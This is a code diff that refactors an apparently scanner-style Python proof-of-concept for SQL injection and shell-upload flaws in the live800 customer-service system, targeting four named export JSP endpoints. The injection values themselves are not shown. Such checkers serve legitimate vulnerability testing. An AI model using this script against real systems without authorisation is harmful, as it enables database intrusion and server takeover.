@@ -13,24 +13,17 @@ import sys
 import json
 import requests
 import warnings
-
-
-
-class sta_export_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['live800在线客服系统多处SQL注入/GETSHELL漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
-            "Referer":self.url + "/live800/sta/referrerTypeSta.jsp",
+            "Referer":url + "/live800/sta/referrerTypeSta.jsp",
             "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
             "Accept-Encoding":"gzip, deflate"
         }
         turl = "/live800/sta/export/referrerSta.jsp"
-        vulnurl = self.url + turl
+        vulnurl = url + turl
         payload = {
             "export":"csv",
             "vn":"dataAnalyseAdapter_referrer",
@@ -62,7 +55,7 @@ class sta_export_sqli:
         }
 
         turl = "/live800/sta/export/chatTopicSta.jsp"
-        vulnurl = self.url + turl
+        vulnurl = url + turl
         payload = {
             "export":"csv",
             "vn":"dataAnalyseAdapter_topic",
@@ -88,7 +81,7 @@ class sta_export_sqli:
             return result
 
         turl = "/live800/sta/export/chatHoursSta.jsp"
-        vulnurl = self.url + turl
+        vulnurl = url + turl
         payload = {
             "export":"csv",
             "vn":"dataAnalyseAdapter_close_reason",
@@ -114,7 +107,7 @@ class sta_export_sqli:
             return result
 
         turl = "/live800/sta/export/chatUrlSta.jsp"
-        vulnurl = self.url + turl
+        vulnurl = url + turl
         payload = {
             "export":"csv",
             "vn":"dataAnalyseAdapter_url",
@@ -142,5 +135,5 @@ class sta_export_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = sta_export_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
